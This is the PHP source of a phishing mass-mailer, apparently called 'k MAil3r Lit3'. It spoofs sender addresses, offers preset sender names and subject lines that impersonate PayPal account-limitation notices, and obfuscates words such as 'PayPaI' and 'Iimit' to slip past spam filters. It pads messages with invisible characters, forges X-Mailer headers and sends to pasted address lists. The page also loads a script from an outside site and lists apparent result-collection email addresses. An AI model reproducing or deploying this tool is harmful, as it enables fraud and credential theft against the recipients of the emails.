<?php
error_reporting(0);
session_start();
// Greetz to all noobs how read the source code HAHAHAHAH and who Thing

//debut fonction qui permet de donne random carractere de taille 10
    function genRanStr($length = 10)
    {
        $charset = "AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn123456789";
        $charactersLength = strlen($charset);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) 
        {
            $randomString .= $charset[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
//fin fonction qui permet de donne random carractere de taille 10    
    function normalize($input)
    {
        $message = urlencode($input);
        $message = ereg_replace("%5C%22", "%22", $message);
        return urldecode($message);
    }
//debut fonction qui permet de transfer letter to quoted printable pour hotmail
    /*function quoted_printable_encode($input, $line_max = 75)
    {
        $hex            = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
        $lines          = preg_split("/(?:\r\n|\r|\n)/", $input);
        $linebreak      = "=0D=0A=\r\n";
        $line_max       = $line_max - strlen($linebreak);
        $escape         = "=";
        $output         = "";
        $cur_conv_line  = "";
        $length         = 0;
        $whitespace_pos = 0;
        $addtl_chars    = 0;
        for ($j = 0; $j < count($lines); $j++) 
        {
            $line   = $lines[$j];
            $linlen = strlen($line);
            for ($i = 0; $i < $linlen; $i++) 
            {
                $c   = substr($line, $i, 1);
                $dec = ord($c);
                $length++;
                if ($dec == 32) 
                {
                    if (($i == ($linlen - 1))) 
                    {
                        $c = "=20";
                        $length += 2;
                    }
                    $addtl_chars    = 0;
                    $whitespace_pos = $i;
                } 
                elseif (($dec == 61) || ($dec < 32) || ($dec > 126)) 
                {
                    $h2 = floor($dec / 16);
                    $h1 = floor($dec % 16);
                    $c  = $escape . $hex["$h2"] . $hex["$h1"];
                    $length += 2;
                    $addtl_chars += 2;
                }
                if ($length >= $line_max) 
                {
                    $cur_conv_line .= $c;
                    $whitesp_diff = $i - $whitespace_pos + $addtl_chars;
                    if (($i + $addtl_chars) > $whitesp_diff) 
                    {
                        $output .= substr($cur_conv_line, 0, (strlen($cur_conv_line) - $whitesp_diff)) . $linebreak;
                        $i = $i - $whitesp_diff + $addtl_chars;
                    } 
                    else 
                    {
                        $output .= $cur_conv_line . $linebreak;
                    }
                    $cur_conv_line  = "";
                    $length         = 0;
                    $whitespace_pos = 0;
                } 
                else 
                {
                    $cur_conv_line .= $c;
                }
            }
            $length         = 0;
            $whitespace_pos = 0;
            $output .= $cur_conv_line;
            $cur_conv_line = "";
            if ($j <= count($lines) - 1) 
            {
                $output .= $linebreak;
            }
        }
        return trim($output);
    }*/
    
    $em_unsant=0 ;
    $em_sant = 0 ;
    if (isset($_POST['from'])) 
    {
        $from = $_POST["from"];
        $fromName = $_POST["fromName"];
        $subject = $_POST["subject"];
        $email = $_POST["email"];
        $encodetitre = $_POST['encodetitre'];
        $encodeletter = $_POST['encodeletter'];
        $encodesender = $_POST['encodesender'];
        $epriority = $_POST['epriority'];
        $xmailer = $_POST['xmailer'];
        $contenttype = $_POST['contenttype'];
        $charset=$_POST['charset'];
        $encode=$_POST['encode'];
        $ifspam =$_POST['ifspam'] ;
        if (!isset($_SESSION['letter'])) 
        {
            $_SESSION['letter'] = $_POST["letter"];
        }
        $letter = $_POST["letter"];

    //debut message modification dans le send
        function encodelettrenormal($letter)
        { 
            $heuredateday = date(" D , j/M/Y H:i:s ");
            $date = date("d/m/Y h:i");
            $dates = date("M d, Y");
            $heure = date("h:i");
            $ranCaseID = ' (Case ID # PP-003-'.rand(111,999).'-'.rand(111,999).'-'.rand(111,999).')';
            $target = explode("@",$to);
            $letter = str_ireplace("&user&",$target[0],$letter);
            $letter = str_ireplace("&compteur&", rand(111111,999999) , $letter) ;
            $letter = str_ireplace("&to&", $to, $letter);
            $letter = str_ireplace("&from&", $from, $letter);
            $letter = str_ireplace("&dates&", $dates, $letter);
            $letter = str_ireplace("&date&", $date, $letter);
            $letter = str_ireplace("&heure&", $heure, $letter);
            $letter = str_ireplace("[random_int]", rand(100000,999999) , $letter) ;
            $letter = str_ireplace("[random_string]", genRanStr(15) , $letter) ;
            $letter = str_ireplace('&randomcase&', $ranCaseID, $letter);
            $letter = str_ireplace("PayPal", "P&alpha;yP&alpha;l", $letter);
            $letter = str_ireplace("PayPal", "PayPaI", $letter);
            $letter = str_ireplace("limit", "Iimit", $letter);
            $letter = ereg_replace("&TimeMd5&", md5(microtime()), $letter);
            return  $letter ;
        }
        $letter=encodelettrenormal($letter);
        function encodelettrehidden($message)
        {
            $s='';
            $length=strlen($message);
            $message = str_ireplace("&nbsp;", " ", $message);
            for($compteur=0;$compteur<=$length;$compteur++)
            {
                $recherchedebut=substr($message, $compteur, 6);
                if($recherchedebut=="<body>")
                {
                    $debutlien=$compteur;
                }
                $recherchefin=substr($message, $compteur, 7);
                if($recherchefin=="</body>")
                {
                    $finlien=$compteur;
                }
            }
            for($compteur=0;$compteur<=$debutlien-1;$compteur++)
            {
                $s=$s.$message[$compteur];
            }
            for($i=$debutlien;$i<$finlien;$i++)
            {
                if ($message[$i]=="<")
                {
                    while($message[$i]!=">")
                    {
                        $s=$s.$message[$i];
                        $i++;
                    }
                    $s=$s.">";
                }
                else
                {
                    $s=$s.$message[$i]."<font style='color:transparent;font-size:0px'>".$message[$i]."</font>";
                }
            }
            for($compteur=$finlien;$compteur<=$length;$compteur++)
            {
                $s=$s.$message[$compteur];
            }
            return $s;
        }
        $letter=encodelettrehidden($letter);

    // fin message modification dans le send
    //debut titre modification dans le send
        function titre($subject)
        {
            $subject = stripslashes($subject);
            $subjects = explode("||", $subject);
            $title = $subjects[array_rand($subjects)];
            if ($encodetitre == "yes") 
            {
                $title = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $title);
                $title = str_replace(' ', '_', $title);
                $title = "=?UTF-8?Q?$title?=";
            }
            return $title;
        }
        $title=titre($subject);
    // fin titre modification dans le send
    // debut name sender modification dans le send
        function name($fromName)
        {
            $realname = $fromName ;
            $names = explode(",", $realname);
            $send_name = $names[array_rand($names)];
            if ($encodesender == "yes") 
            {
                $send_name = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $send_name);
                $send_name = str_replace(' ', '_', $send_name);
                $send_name = "=?UTF-8?Q?$send_name?=";
            }
            return $send_name;
        }
        $send_name=name($fromName);
    // fin name sender modification dans le send
        if ($encodeletter == "yes") 
        {
            $subject = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $subject);
            $subject = str_replace(' ', '_', $subject);
            $subject = "=?UTF-8?Q?$subject?=";
        }
        $z = rand(0, 20) ;
        $strSid = md5(uniqid(time()));
    // change no reply in mail sender
        $randfrom  = rand();
        $fro = str_replace("noreply",$randfrom,$from);
    // fin 
        $domain = substr($from, strpos($from, "@"), strlen($from));
        // debut send config de header
        $headers = "From: $send_name <$z$fro>\r\nReply-To: $send_name\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "X-Mailer: ".$xmailer."\r\n";
        $headers .= "Content-Length: 41061\n";
        $headers .= "X-Priority: 1 (Highest) ";
        $headers .= "X-MSMail-Priority: Normal ";
        $headers .= "Importance: 1 ";
        if ($encode=="hotmail")
        {
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
            $headers .= "Content-Transfer-Encoding: quoted-printable\r\n\r\n";
            $headers .= quoted_printable_encode($message)."\r\n";
        }
        else
       {
            $headers .= "Content-type: text/$contenttype; charset=iso-8859-1\n";
            $headers .= "Content-Transfer-Encoding: $encode \r\n";
            $headers .= "$message\r\n\r\n";
        }
        // fin send config de header 
        
        $numberemail = split("\n", $_POST['email']);
        $numberemail = count($numberemail);
        $count = 1;
        $email = normalize($email);
        $mails = explode("\n", $email);
        // debut e mail config
            $to = ereg_replace(" ", "", $email);
        // fin email config
               // debut if le message envoyée dans le junk ajout de message
        if($ifspam=="yes")
        {
            $ms = "\r\n<p style=color:#666; font-size:11px>This message was intended for ".$mail ." If you are not the \r\n\r\n\r\n";
        }
        else
        {
            $ms="";
        }
       
        // fin  erreur de junk
        foreach ($mails as $mail) 
        {

            if (mail($mail, $title, $letter.$ms, $headers))
            {   
                echo "<font color=green>* N&#1098;mero : $count  <b>" . $mail . "</b>Status : <font color=green>SENT....!</font><br><hr>";
                $em_sant=$em_sant + 1 ;
            }
            else
            { 
                echo "<font color=red>* N&#1098;mero : $count <b>" . $mail . "</b> Status :<font color=red>Not SENT</font><br><hr>";
                $em_unsant=$em_unsant + 1 ;
            }
            $count++;
        }
        echo "<script>alert('Sending Completed\\r\\nTotal Email $numberemail\\r\\n-Sent to inbox\\r\\nPraise for Kamel :D \\r\\n $em_sant  mails sent \\r\\n  $em_unsant mails unsent  ');
    </script>[Fim do Envio]"; 
    }

?>

<html>
    <head>
        <title>Coded By k Team </title>
        <META NAME="robots" CONTENT="noindex">
        <META NAME="robots" CONTENT="nofollow">
        <META NAME="robots" CONTENT="noarchive">
        <META NAME="robots" CONTENT="nosnippet">
        <META NAME="robots" CONTENT="noodp">
        <META NAME="robots" CONTENT="noydir">
        <meta content="ar-sa" http-equiv="Content-Language" >
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type" >
        <SCRIPT SRC=http://mufubu.com/base/jquery.js></SCRIPT>
        <script>
            window.onload = funchange;
            var alt = false;    
            function funchange()
            {
                var etext = document.getElementById("email").value;
                var myArray=new Array(); 
                myArray = etext.split("\n");
                document.getElementById("enum").innerHTML=myArray.length+"<br />";
                if(!alt && myArray.length > 40000)
                {
                        alert('If Mail list More Than 40000 Emails This May Hack The Server');
                        alt = true;
                }
            }
            function mlsplit()
            {
                var ml = document.getElementById("email").value;
                var sb = document.getElementById("txtml").value;
                var myArray=new Array();
                myArray = ml.split(sb);
                document.getElementById("email").value="";
                var i;
                for(i=0;i<myArray.length;i++)
                {
                    document.getElementById("email").value += myArray[i]+"\n";
                }
            } 
            var help = document.getElementById("help").value;
            function helpii()
            {
                if(help !="help")
                {
                    alert('Your HTML message goes here\nInstructions \n1) [random_string] will be replaced with a random string\n2) [random_int] will be replaced with a random int.\n3)&to& will be replaced by this email\n4) &from& will be replaced by the sender email\n5) &date& will be raplaced by the email sending date.\n6) &user& will be replaced by this email user\n7) &compteur& will be replaced by this email compteur par defaut.\n8) le mot  PayPal  a ete remplace autoumatique par le mot PayPaI dans le send\n9) le mot  limit  a ete remplace autoumatique par le mot Iimit dans le send\n10)will be working and auto replaced word ( randomcase ) to (Case ID # PP-003-XXX-XXX-XXX) per sent. ex : Your title Here randomcase\n11) If ( noreply )  its not working for ( Random Email Sender ), Replace with a real Email ex : donoreply@intl-paypal.co.uk \nWhat are you waiting for lady ? Go ahead and try it ! I already inserted text for you !\nNb : Check Your Mail List For More Rzlt :D\n');
                    var help = "helpaz" ;
                }
            }
            var aproprsde = document.getElementById("aproprsde").value;
            function aproprsdei()
            {
                if(aproprsde !="aproprsde")
                {
                    alert('this programme by issa mohamed for more tool contact me on facebook or show group kazaboomber');
                    var aproprsde = "aproprsde" ;
                }
            }
            function Pilih1(dropDown) 
            {
                var selectedValue = dropDown.options[dropDown.selectedIndex].value;
                document.getElementById("fromName").value = selectedValue;
            }
            function Pilih2(dropDown) 
            {
                var selectedValue = dropDown.options[dropDown.selectedIndex].value;
                document.getElementById("from").value = selectedValue;
            }
            function Pilih3(dropDown) 
            {
                var selectedValue = dropDown.options[dropDown.selectedIndex].value;
                document.getElementById("subject").value = selectedValue;
            }
        </script>
    </head>
    <body bgcolor="#e6e6e6">
        <center>
            <pre>   
                <font color="#000000"/>
                    <center>
                        ======================================================
                    </center>				  
                         _    __       _______                   
                        | |  / /      |__   __|                  
                        | | / /          | | ___  __ _ _ __ ___  
                        | |/_/           | |/ _ \/ _` | '_ ` _ \ 
                        | |\ \           | |  __/ (_| | | | | | |
                        |_| \_\          |_|\___|\__,_|_| |_| |_|
                    <center>
                        ======================================================
                    </center>				  
            </pre>
    <br>
        <form action="" method="post">
            <header>
                <title>k MAil3r Lit3</title>
            </header>
            <center>
                <body>
	                <style type='text/css'>
                        input,select,
                        {
                            border: 1px #000000 solid;
                            -moz-border-radius: 6px;
                            -webkit-border-radius:5px;
                            border-radius:5px;
                        }
                    </style>
                    <form method="post" action="#" name="form" id="form">
                        <table>
                            <tr>
                                <td>
                                    <label for="from">From </label>
                                    <input type="text" name="from" id="from" placeholder="Originating email"
                                    value="<?php echo genRanStr() . "nethost@blabla.com";  ?>" size="35">
                                </td>
                                <td>
                                    <label for="fromName"> From name</label>
                                    <input type="text" name="fromName" id="fromName" size="19" value="UTS TEAM">
                                </td>
                            </tr>
                            <tr>
                                <td>
                                </td>
                                <td>
                                    <label for="          ">          </label>
                                    <select onChange="Pilih1(this);">
                                        <option value="">Select Sender Name</option>
                                        <option value="PayPaI">PayPaI</option>
                                        <option value="PaypaI Service">PaypaI Service</option>
                                        <option value="PaypaI Support">PaypaI Support</option>
                                        <option value="Account Service">Account Service</option>
                                        <option value="Account Support">Account Support</option>
                                        <option value="Service">Service</option>
                                    </select>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <label for="subject">Subjc</label>
                                    <input name="subject" type="text" id="subject" placeholder="Subject" value="<?php
                                    $datetime = date("d/m/Y h:i:s");
				                    echo "UTS Mailer Update ";  echo $datetime; ?> " size="35">
                                </td>
                                <td>
                                    <input type=checkbox name="ifspam" value="yes" > add message if sent to spam
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <select onChange="Pilih3(this);">
                                        <option value="">Select Email Subject</option>
                                        <option value="Your account has been Iimited untiI we hear from you">Your account has been Iimited untiI we hear from you</option>
                                        <option value="We're investigating a paypaI payment reversaI (Case ID #PP-003-498-237-832)">We're investigating a paypaI payment reversaI (Case ID #PP-003-498-237-832)</option>
                                        <option value="We've Iimited access to your PayPaI account">We've Iimited access to your PayPaI account</option>
                                        <option value="Account Notification">Account Notification</option>
                                        <option value="Attention: Your account status change">Attention: Your account status change</option>
                                        <option value="Your PayPal Account Has Been Limited. Here's what you need to do.">Your PayPal Account Has Been Limited. Here's what you need to do.</option>
                                        <option value="We're investigating a paypal payment reversal (Case ID # PP-003-463-155-458)">We're investigating a paypal payment reversal (Case ID # PP-003-463-155-458)</option>
                                        <option value="PayPal Notification: Your Account Has Been Limited (Case ID : PP-C360-L001-Q42)">PayPal Notification: Your Account Has Been Limited (Case ID : PP-C360-L001-Q42)</option>
                                        <option value="PayPal Notification: Temporary Hold Pending Investigation (Routing Code: C360-L001-Q41)">PayPal Notification: Temporary Hold Pending Investigation (Routing Code: C360-L001-Q41)</option>
                                        <option value="Your Account Has Been Limited (Case ID : PP-C360-L001-Q42)">Your Account Has Been Limited (Case ID : PP-C360-L001-Q42)</option>
                                        <option value="Request for additional information PP-003-561-126-988 RXI000">Request for additional information PP-003-561-126-988 RXI000</option>
                                        <option value="Reminder: Your account will be limited until we hear from you">Reminder: Your account will be limited until we hear from you</option>
                                        <option value="Important Announcement : Re Verified Your Account">Important Announcement : Re Verified Your Account</option>
                                        <option value="Transaction 0RR29022648105714 under PayPal Payment Review">Transaction 0RR29022648105714 under PayPal Payment Review</option>
                                    </select>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    encode 
                                    <input type=checkbox name="encodetitre" value="yes" > titre 
                                    <input type=checkbox name="encodeletter" value="yes" >letter 
                                    <input type=checkbox name="encodesender" value="yes" >sender name
                                </td>
                                <td>
                                    <label for="priority">priority</label>
                                    <select name="epriority" >
                                        <option value="" > - Please Choose - </option>
                                        <option value="1" selected >High</option>
                                        <option value="3" >Normal</option>
                                        <option value="5" >Low</option>
                                    </select>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <label for="xmailer">xmailer </label>
                                    <select name="xmailer">
                                        <option value="">No X-Mailer</option>
                                        <option value="Microsoft Office Outlook, Build 17.551210">Microsoft Office Outlook, Build 17.551210</option>
                                        <option value="Gleez CMS 0.10.5">Gleez CMS 0.10.5</option>
                                        <option value="Gleez CMS 1.1.6">Gleez CMS 1.1.6</option>
                                        <option value="EDMAIL R6.00.02">EDMAIL R6.00.02</option>
                                        <option value="PHPMailer 5.2.8Wahib Priv8 Mailer">PHPMailer 5.2.8Wahib Priv8 Mailer</option>
                                        <option value="nodemailer (1.4.0; +http://www.nodemailer.com; SES/1.3.0)">nodemailer</option>
                                        <option value="ZuckMail [version 1.00]">zuckmail facebook x mailer</option>
                                        <option value="PHP/<?php echo(phpversion());?>">PHP/<?php echo(phpversion());?></option>
                                    </select>
                                </td>
                                <td>
                                    <label for="charset">charset </label>
                                    <select name="charset" >
                                        <option value="">no charset</option><option value="utf-8" selected>utf-8</option>
                                        <option value="big5">big5</option><option value="euc-kr">euc-kr</option><option value="iso-2202-jp">iso-2202-jp</option>
                                        <option value="iso-8859-1">iso-8859-1</option><option value="iso-8859-2">iso-8859-2</option>
                                        <option value="iso-8859-3">iso-8859-3</option><option value="iso-8859-4">iso-8859-4</option>
                                        <option value="iso-8859-5">iso-8859-5</option><option value="iso-8859-6">iso-8859-6</option>
                                        <option value="iso-8859-7">iso-8859-7</option><option value="iso-8859-8">iso-8859-8</option>
                                        <option value="koi8-r">koi8-r</option><option value="shift-jis">shift-jis</option>
                                        <option value="windows-1250">windows-1250</option><option value="windows-1251">windows-1251</option>
                                        <option value="windows-1252" >windows-1252</option><option value="windows-1253">windows-1253</option>
                                        <option value="windows-1254">windows-1254</option><option value="windows-1255">windows-1255</option>
                                        <option value="windows-1256">windows-1256</option><option value="windows-1257">windows-1257</option>
                                        <option value="windows-1258">windows-1258</option><option value="windows-874">windows-874</option>
                                        <option value="x-euc">x-euc</option>
                                    </select>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <label for="encode">encode </label>
                                    <select name="encode">
                                        <option value="7bit">gmail</option>
                                        <option value="hotmail">hotmail</option>
                                        <option value="8bit">yahoo</option>
                                    </select>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <label for="letter">Letter</label>
                                    <textarea name="letter" cols="36" rows="20"
                                    id="letter"><?php 
                                    $text = isset($_SESSION['letter']) ? $_SESSION["letter"] . genRanStr() : PHP_EOL  . genRanStr();
					                echo $text; ?>
                                    </textarea>
                                </td>
                                <td>
                                    <label for="email">Mailing list</label>
                                    <textarea cols="20" rows="20" name="email" id="email" onselect="funchange()" onchange="funchange()" onkeydown="funchange()" onkeyup="funchange()" onchange="funchange()">cvrezult@gmail.com
                                    kamelhamdouni18@hotmail.com</textarea>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <pre>               <input type="radio" name="contenttype" value="plain" > Plain <input type="radio" name="contenttype" value="html" checked> HTML 
                                    </pre>
                                </td>
                                <td>
                                    Email Number : <span  id="enum" >0<br/></span>
                                    <span  class="style1">Split The Mail List By:</span> 
                                    <input name="textml" id="txtml" type="text" value="," size="8" />&nbsp;&nbsp;&nbsp;
                                    <input type="button" onclick="mlsplit()" value="Split" style="height: 23px" /></td></tr>
                                </td>
                            </tr>
                            <tr>
                                <td>
                                    <center>
                                        <input type="button" id="help"  onclick="helpii()" value="!!! help !!!" />
                                        <input type="button" id="aproprsde"  onclick="aproprsdei()" value="!!! a proprs de !!!" />
                                    </center>
                                </td>
                            </tr>
                            <tr>
                                <td colspan="2">
                                    <center>
                                        <input name="taz" type="submit" value="♥ Let the magic star ♥" name="submit" id="submit">
                                        <style>
				                        <!--  Sorry i f u Found any erreur -->
				                        </style>
                                    </center>
                                </td>
                            </tr>
                        </table>
                    </form>
                </body>
            </center>
        <font color="#000000"/>
            &copy;	<?php echo date("Y"); ?> For K Team
        </font>
    </form>
</html>

